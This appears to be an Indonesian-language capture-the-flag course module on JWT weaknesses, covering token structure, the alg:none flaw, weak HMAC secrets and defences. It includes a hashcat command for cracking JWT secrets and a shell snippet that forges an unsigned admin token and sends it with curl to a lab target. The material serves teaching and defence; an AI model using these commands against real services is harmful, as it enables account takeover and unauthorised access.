# Modul 7 · Kelemahan JWT (JSON Web Token)

> Lab: **07-tokenforge** · Kesulitan: medium · Prasyarat: Modul 4 (auth/cookie)

## Yang akan Anda pelajari

- Struktur JWT: header, payload, signature.
- Apa itu `alg:none` dan kenapa menerimanya fatal.
- Kenapa secret HMAC lemah bisa di-crack.
- Cara menempa (forge) token.

## Teori singkat

JWT adalah token tiga bagian dipisah titik, masing-masing **base64url**:

```
eyJhbG...  .  eyJ1c2Vy...  .  SflKxwRJ...
  header          payload         signature
```

- **header**: `{"alg":"HS256","typ":"JWT"}` — algoritma tanda tangan.
- **payload**: data klaim, mis. `{"user":"guest","role":"user"}`.
- **signature**: tanda tangan atas `header.payload` memakai secret, untuk
  memastikan token tidak diubah.

> Penting: payload hanya **base64**, bukan rahasia. Siapa pun bisa membacanya.
> Yang menjaga keaslian adalah **signature** — kalau verifikasinya cacat, token
> bisa dipalsukan.

### Celah 1 — `alg:none`

Spesifikasi JWT punya algoritma `none` (tanpa tanda tangan). Kalau server menerima
header `{"alg":"none"}`, penyerang cukup membuat payload apa pun (mis.
`role:admin`) **tanpa** signature. Server yang tidak menolak `none` akan percaya.

### Celah 2 — secret HMAC lemah

Kalau `alg:HS256` dipakai dengan secret lemah (`secret`, `password`, nama app),
secret bisa di-crack offline dari satu token:

```bash
hashcat -m 16500 token.txt wordlist.txt
```

Setelah tahu secret, Anda bisa menandatangani token admin yang valid.

## Cara mengenali

- Cookie/header `Authorization: Bearer <token>` berbentuk tiga bagian base64.
- Decode payload (bagian tengah) → cari `role`, `admin`, `exp`.

## Praktik (lab 07-tokenforge)

```bash
./ctf-tmux 07-tokenforge
# jalur alg:none:
h=$(printf '{"alg":"none"}'              | base64 | tr '+/' '-_' | tr -d '=')
p=$(printf '{"user":"x","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
curl -s -b "token=$h.$p." $TARGET/ | grep FLAG
```

**Target:** jadi admin, baca flag `user`. Dua jalur (none / secret lemah) di
[`solution/WRITEUP.md`](solution/WRITEUP.md). Hint: [`README.md`](README.md).

## Checklist lulus

- [ ] Anda bisa memecah & mendecode ketiga bagian JWT.
- [ ] Anda menempa token admin via `alg:none`.
- [ ] (opsional) Anda menandatangani token dengan secret yang ditebak.
- [ ] Anda paham kenapa payload bukan rahasia, dan signature yang penting.

## Dunia nyata

Kelemahan `alg:none` dan `alg` confusion (RS256→HS256) adalah bug JWT paling
terkenal; banyak library pernah rentan. Secret lemah tetap jadi penyebab umum
pengambilalihan akun.

## Pertahanan

- **Tolak `alg:none`**; tetapkan algoritma yang diharapkan di server (jangan ambil
  dari token).
- Secret HMAC panjang & acak (≥256-bit), atau pakai kunci asimetris (RS/ES) dengan
  benar.
- Verifikasi `exp`, `iss`, `aud`; pakai library teruji.

## Lanjut

➡️ **Modul 8 · [Stack Buffer Overflow](../08-securebox/MATERI.md)** (lab 08-securebox)
